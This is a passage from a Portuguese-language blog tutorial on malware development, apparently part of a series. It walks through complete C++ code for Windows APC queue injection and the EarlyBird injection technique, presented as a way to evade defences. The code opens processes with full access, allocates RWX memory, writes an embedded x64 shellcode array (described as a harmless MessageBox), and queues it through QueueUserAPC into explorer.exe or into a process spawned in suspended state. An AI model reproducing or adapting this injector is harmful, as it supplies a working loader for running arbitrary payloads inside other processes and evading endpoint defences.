</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
</span></span></code></pre></div><p>Assumindo que o processo existe, vamos definir algumas vari√°veis que ser√£o utilizadas ao longo do c√≥digo e faremos uso da API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a> repassando os valores <code>PROCESS_ALL_ACCESS</code>, que nos d√° permiss√£o total, e o PID do processo, que est√° em <code>procEntry.th32ProcessID</code>. Teremos como retorno um handle.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Opening process pointed by procEntry.th32ProcessID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Opening chosen process...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error opening process &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">th32ProcessID</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>A seguir, alocaremos uma regi√£o de mem√≥ria RWX no processo remoto com <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>, repassando o handle adquirido, definindo o tamanho a ser alocado como o tamanho do shellcode, a soma das flags <code>MEM_RESERVE</code> e <code>MEM_COMMIT</code> como tipo de aloca√ß√£o e <code>PAGE_EXECUTE_READWRITE</code> como tipo de prote√ß√£o das p√°ginas de mem√≥ria (RWX).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Allocating memory in remote process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Allocating &#34;</span> <span class="o">&lt;&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; bytes in remote process..&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">allocatedMem</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allocatedMem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error in allocating memory&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>Caso a aloca√ß√£o tenha sucesso, iremos escrever nosso shellcode no processo remoto com <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Writing shellcode to allocated memory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Writing shellcode at 0x&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">allocatedMem</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocatedMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error in writing shellcode&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>Com o shellcode j√° injetado, teremos que enfileir√°-lo em uma APC em uma thread que fique em um estado <em>alertable</em>. Para enumerarmos as threads de todos os processos no sistema, utilizaremos novamente a API <code>CreateToolHelp32Snapshot</code> passando a constante <code>TH32CS_SNAPTHREAD</code> como primeiro argumento.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of all threads in the system...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error in getting list of active threads&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>Na √∫ltima parte do injetor, devemos instanciar uma struct <code>THREADENTRY32</code> que servir√° para armazenar temporariamente cada thread do sistema no la√ßo <code>for</code>. Seu valor vai ser modificado a cada itera√ß√£o por <code>Thread32Next</code>.</p>
<p>Para injetarmos apenas nas threads do processo v√≠tima, realizaremos a compara√ß√£o <code>threadEntry.th32OwnerProcessID == procEntry.th32ProcessID</code>, onde o PID do processo que cont√©m a thread √© comparado com o PID do nosso processo alvo.</p>
<p>Caso essa compara√ß√£o seja verdadeira, iremos obter um handle de acesso total √† thread com <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread">OpenThread</a>, repassando o valor <code>THREAD_ALL_ACCESS</code> como primeiro argumento.</p>
<p>Por fim, usaremos <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a>, repassando a localiza√ß√£o remota do shellcode escrito, o handle para a thread e o valor NULL - para indicar que n√£o √© necess√°rio repassar argumentos para o shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">THREADENTRY32</span> <span class="n">threadEntry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">threadEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Finally, call QueueUserAPC to the main thread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of active threads in target process...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="kr">thread</span> <span class="o">=</span> <span class="n">Thread32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadEntry</span><span class="p">);</span> <span class="kr">thread</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">THREAD_INJECTION_LIMIT</span><span class="p">;</span> <span class="kr">thread</span> <span class="o">=</span> <span class="n">Thread32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadEntry</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">threadEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Code for queueing APC to main thread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">threadEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Failed opening thread &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">threadEntry</span><span class="p">.</span><span class="n">th32ThreadID</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Queueing APC for thread &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">threadEntry</span><span class="p">.</span><span class="n">th32ThreadID</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">allocatedMem</span><span class="p">,</span> <span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Note que na compara√ß√£o do la√ßo for estamos utilizando uma vari√°vel local <code>i</code>, comparada no in√≠cio com <code>THREAD_INJECTION_LIMIT</code> e incrementada ao fim dele, para evitar que a inje√ß√£o se d√™ em todas as threads.</p>
<p>Abaixo podemos ver o resultado quando o alvo √© o <em>explorer.exe</em>. Foi utilizado o um valor de <code>THREAD_INJECTION_LIMIT</code> de 2, mas √© poss√≠vel que a cada execu√ß√£o esse valor possa mudar. Caso o shellcode n√£o rode, √© recomendado aumentar esse valor e tentar novamente.</p>

<img src="img/02d35dc60d39f4bebb0df0f074f7fb7b.png"  class="center"  style="border-radius: 1px;"    />


<p>Ao clicar no &ldquo;Ok&rdquo;, o processo do explorer ir√° sair, pois nosso shellcode, nesse caso, chama a <code>ExitProcess</code>. Em shellcodes que retornam para a thread principal, isso pode causar crash da aplica√ß√£o.</p>
<h3 id="earlybird-injection">EarlyBird Injection<a href="#earlybird-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Para ilustrarmos a efetividade do uso de APCs em cen√°rios de evas√£o de defesas, iremos testar uma varia√ß√£o de inje√ß√£o chamado EarlyBird, ou, &ldquo;O madrugador&rdquo;.</p>
<p>O EarlyBird tem esse nome devido ao modo como a APC √© injetada no processo-alvo. Sua vantagem com rela√ß√£o √† t√©cnica descrita na se√ß√£o anterior √© que n√£o √© necess√°rio que um processo esteja rodando e tenha uma thread que entre em modo alertable para que ele seja v√≠tima. Para isso, o injetor ir√° criar um processo em modo suspenso - em que a thread principal ainda n√£o iniciou - configurar e enfileirar a fun√ß√£o maliciosa e ela sempre ir√° rodar, visto que APCs tamb√©m s√£o executadas assim que um processo criado em modo suspenso √© resumido.</p>
<blockquote>
<p>Por criar um processo em modo suspenso, a inje√ß√£o EarlyBird pode ter um n√≠vel de detec√ß√£o maior solu√ß√µes mais sofisticadas, como EDRs.</p>
</blockquote>
<p>Vamos analisar a constru√ß√£o do <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/EarlyBird%20Injector">c√≥digo</a>.</p>
<h4 id="earlybird-injector">EarlyBird Injector<a href="#earlybird-injector" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>O c√≥digo a seguir √© uma <em>proof-of-concept</em> da t√©cnica EarlyBird.</p>
<p>Utilizaremos as fun√ß√µes com prot√≥tipos definidos nos headers <code>windows.h</code> e <code>iostream</code> para a constru√ß√£o do injetor e funcionamento auxiliar, como escrita de mensagens.</p>
<p>Tamb√©m iremos definir uma vari√°vel global para guardar nosso shellcode x64 - como no caso anterior, apenas um shellcode n√£o malicioso que utiliza MessageBox.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Spawns a MessageBox
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3</span><span class="s">&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>A primeira coisa que o c√≥digo da fun√ß√£o <em>main</em> apresenta √© a possibilidade de usarmos o injetor em qualquer processo. Para isso, o c√≥digo abaixo apresenta a implementa√ß√£o que permite especificar o caminho completo at√© o EXE v√≠tima atrav√©s da linha de comando.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;USAGE: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;path</span><span class="se">\\</span><span class="s">to</span><span class="se">\\</span><span class="s">process&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>O seguinte trecho ir√° utilizar o path para o EXE especificado em <code>argv[1]</code> como primeiro argumento da fun√ß√£o <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a>. Criaremos vari√°veis locais tendo como tipo as estruturas <code>STARTUPINFOA</code> (al√©m da sua inicializa√ß√£o) e <code>PROCESS_INFORMATION</code>, para que a cria√ß√£o do processo tenha sucesso. Al√©m disso, √© importante que a flag de cria√ß√£o seja <code>CREATE_SUSPENDED</code>, para que a thread principal n√£o seja executada imediatamente, gerando uma oportunidade para efetuarmos a inje√ß√£o.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">STARTUPINFOA</span> <span class="n">startupInfo</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOA</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">procInfo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Creating process &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="n">CreateProcessA</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">startupInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">procInfo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error on CreateProcess: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] PID: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">procInfo</span><span class="p">.</span><span class="n">dwProcessId</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span></code></pre></div><p>Ap√≥s a cria√ß√£o bem sucedida, devemos alocar um espa√ßo de mem√≥ria RWX no processo remoto. Para isso, podemos utilizar a fun√ß√£o <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>, repassando o handle para o processo, um endere√ßo preferencial, tamanho, tipo de aloca√ß√£o e de prote√ß√£o das p√°ginas de mem√≥ria.</p>
<p>No injetor, o handle para o processo v√≠tima est√° em <code>procInfo.hProcess</code>. Definiremos o tamanho da aloca√ß√£o para o tamanho do shellcode, al√©m soma das constantes <code>MEM_RESERVE</code> e <code>MEM_COMMIT</code> para o tipo de aloca√ß√£o. Para definirmos as p√°ginas de mem√≥ria alocadas como RWX, iremos utilizar a contante <code>PAGE_EXECUTE_READWRITE</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Allocating memory in remote process...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">shellcodeRemoteLocation</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
